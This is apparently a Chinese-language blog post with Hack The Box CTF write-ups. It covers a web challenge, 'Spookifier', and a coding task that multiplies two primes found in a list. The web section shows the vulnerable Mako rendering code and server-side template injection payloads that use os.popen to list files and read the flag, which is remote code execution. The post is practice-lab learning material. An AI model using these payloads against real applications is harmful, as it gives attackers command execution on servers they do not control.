---
title: "HTB-CTF Challenge做题记录"
description: "HTB-Challenge，HTB的一些类型题目，比较深入全面，方向也是比较广泛的，没事儿去学习了一下"
date: "2025-08-30"
tags:
  - "HTB"
  - "CTF"
  - "WEB"
  - "Coding"
  - "MOBILE"
  - "CRYPTO"
  - "REVERSE"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "htb-challenge"          # 随机URL字符串
---
<meta name="referrer" content="no-referrer">


# HTB-CTF-记录

## WEB

### Spookifier 间谍工具

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?
> 最近出现了一种能为你生成恐怖名字的应用。该应用的用户后来发现他们的真实姓名也被神奇地更改了，导致生活陷入混乱。你能帮忙让这个应用下线吗？

直接定位到漏洞点

```python
from mako.template import Template


def generate_render(converted_fonts):
	result = '''
		<tr>
			<td>{0}</td>
        </tr>
        
		<tr>
        	<td>{1}</td>
        </tr>
        
		<tr>
        	<td>{2}</td>
        </tr>
        
		<tr>
        	<td>{3}</td>
        </tr>

	'''.format(*converted_fonts)
	
	return Template(result).render()

def change_font(text_list):
	text_list = [*text_list]
	current_font = []
	all_fonts = []
	
	add_font_to_list = lambda text,font_type : (
		[current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear()
		) and None

	add_font_to_list(text_list, 'font1')
	add_font_to_list(text_list, 'font2')
	add_font_to_list(text_list, 'font3')
	add_font_to_list(text_list, 'font4')

	return all_fonts

def spookify(text):
	converted_fonts = change_font(text_list=text)

	return generate_render(converted_fonts=converted_fonts)

```

直接渲染了，并且是Mako引擎

```
${7*7}
```

![image-20250831121956207](https://raw.githubusercontent.com/bx33661/Picgo/main/20250831121958413.png)

```
${__import__('os').popen('ls').read()}
${__import__('os').popen('cat /fla*').read()}
```

得到flag





## Coding

### Primed for Action 

> Intelligence units have intercepted a list of numbers. They seem to be used in a peculiar way: the adversary seems to be sending a list of numbers, most of which are garbage, but two of which are prime. These 2 prime numbers appear to form a key, which is obtained by multiplying the two. Your answer is the product of the two prime numbers. Find the key and help us solve the case.
> 情报单位截获了一份数字列表。它们似乎以一种特殊的方式使用：对手似乎在发送一份数字列表，其中大部分是垃圾数据，但有两项是质数。这两个质数似乎组成了一把密钥，通过将这两个数相乘获得。你的答案是这两个质数的乘积。找到密钥并帮助我们破解案件。

就是写一个算法

```python
# take in the number
n = input()

nums = list(map(int, n.split()))

def is_prime(x: int) -> bool:
    if x < 2:
        return False
    if x % 2 == 0:
        return x == 2
    i = 3
    while i * i <= x:
        if x % i == 0:
            return False
        i += 2
    return True

# 找两个质数
primes = [x for x in nums if is_prime(x)]

# 计算乘积
ans = primes[0] * primes[1]

# print answer
print(ans)
```
![image-20250831120324987](https://raw.githubusercontent.com/bx33661/Picgo/main/20250831122737951.png)